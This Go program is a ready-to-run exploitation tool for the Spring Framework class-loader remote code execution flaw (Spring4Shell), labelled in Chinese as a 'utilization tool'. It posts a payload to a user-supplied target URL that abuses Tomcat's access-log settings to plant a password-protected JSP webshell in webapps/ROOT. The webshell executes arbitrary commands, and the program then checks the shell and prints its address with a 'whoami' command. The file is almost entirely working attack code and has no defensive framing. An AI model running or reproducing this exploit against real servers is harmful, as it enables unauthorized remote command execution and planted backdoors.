package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"
)

func init() {
	eg := `

Spring-core-rce_v2 利用工具

`
	fmt.Println(eg)

}

func main() {
	vulurl := flag.String("u", "", "target url")
	fmt.Println(flag.Arg(0))
	flag.Parse()
	if *vulurl != "" {
		explo(*vulurl)

	}

}

func explo(url string) {
	timeout := time.Duration(5 * time.Second)
	client := http.Client{
		Timeout: timeout}
	data := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=n1n1tom&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
	req, err := http.NewRequest("POST", url, strings.NewReader(data))
	if err != nil {
		return
	}

	req.Header.Set("suffix", "%>//")
	req.Header.Set("c1", "Runtime")
	req.Header.Set("c2", "<%")
	req.Header.Set("DNT", "1")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("连接失败", resp)
	}

	shellurl := url + "n1n1tom.jsp"
	Get_res, err := http.Get(shellurl)
	if err != nil {
		return
	}

	if Get_res.StatusCode == 200 {
		log.Println("webshell地址为:", shellurl+"?pwd=j&cmd=whoami")

	} else if 200 == Get_res.StatusCode {
		log.Println("上传失败")

	}
}
